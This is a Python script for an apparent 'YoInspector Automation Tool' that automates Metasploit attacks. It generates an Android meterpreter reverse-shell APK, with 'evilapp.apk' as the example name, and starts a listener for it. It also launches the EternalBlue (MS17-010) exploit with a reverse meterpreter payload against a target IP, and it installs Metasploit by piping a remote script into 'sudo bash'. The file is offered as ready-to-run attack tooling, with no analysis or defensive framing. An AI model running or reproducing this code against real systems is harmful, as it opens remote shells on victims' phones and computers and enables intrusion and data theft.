import os
import subprocess
import socket

def get_local_ip():
    """Get local IP address (LHOST)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

def install_metasploit():
    print("[+] Checking for Metasploit installation...")
    if subprocess.run(["which", "msfconsole"], capture_output=True, text=True).returncode == 0:
        print("[+] Metasploit is already installed!")
        return
    print("[+] Installing Metasploit...")
    try:
        subprocess.run("curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/scripts/ubuntu_install.sh | sudo bash",
                       shell=True, check=True)
        print("[+] Metasploit installed successfully!")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error during installation: {e}")

def setup_metasploit():
    print("[+] Setting up Metasploit database...")
    try:
        subprocess.run(["sudo", "msfdb", "init"], check=True)
        print("[+] Database initialized successfully!")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error setting up Metasploit: {e}")

def generate_android_payload(apk_name, lhost, lport):
    print("[+] Generating Android APK payload...")
    try:
        command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {apk_name}"
        subprocess.run(command, shell=True, check=True)
        print(f"[+] Payload generated: {apk_name}")
        return apk_name
    except subprocess.CalledProcessError as e:
        print(f"[-] Error generating Android payload: {e}")
        return None

def launch_android_listener(lhost, lport):
    handler_script = "android_handler.rc"
    with open(handler_script, "w") as f:
        f.write("use exploit/multi/handler\n")
        f.write("set PAYLOAD android/meterpreter/reverse_tcp\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write("exploit -j\n")

    print("[+] Launching Android listener...")
    subprocess.run(["msfconsole", "-q", "-r", handler_script], check=True)

def exploit_eternalblue(rhost, lhost, lport):
    print("[+] Creating EternalBlue exploit script...")
    script_name = "eternalblue.rc"
    with open(script_name, "w") as f:
        f.write("use exploit/windows/smb/ms17_010_eternalblue\n")
        f.write(f"set RHOSTS {rhost}\n")
        f.write("set TARGET 0\n")
        f.write(f"set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write("exploit -j\n")

    print("[+] Launching EternalBlue exploit...")
    subprocess.run(["msfconsole", "-q", "-r", script_name], check=True)

def main():
    print("===========================================")
    print("         YoInspector Automation Tool       ")
    print("===========================================")
    print("1. Android Exploitation")
    print("2. Windows Exploitation (EternalBlue)")
    print("3. Exit")

    choice = input("Choose an option: ")

    if choice == "1":
        apk_name = input("Enter the desired APK filename (e.g., evilapp.apk): ")
        lhost = input("Enter LHOST (your IP address): ")
        lport = input("Enter LPORT (listening port): ")

        install_metasploit()
        setup_metasploit()
        if generate_android_payload(apk_name, lhost, lport):
            launch_android_listener(lhost, lport)

    elif choice == "2":
        rhost = input("Enter RHOST (target IP address): ")
        lport = input("Enter LPORT (listening port): ")
        lhost = get_local_ip()
        print(f"[+] Auto-detected your LHOST: {lhost}")

        install_metasploit()
        setup_metasploit()
        exploit_eternalblue(rhost, lhost, lport)

    elif choice == "3":
        print("Exiting YoInspector. Goodbye!")
    else:
        print("[-] Invalid choice. Exiting.")

if __name__ == "__main__":
    main()
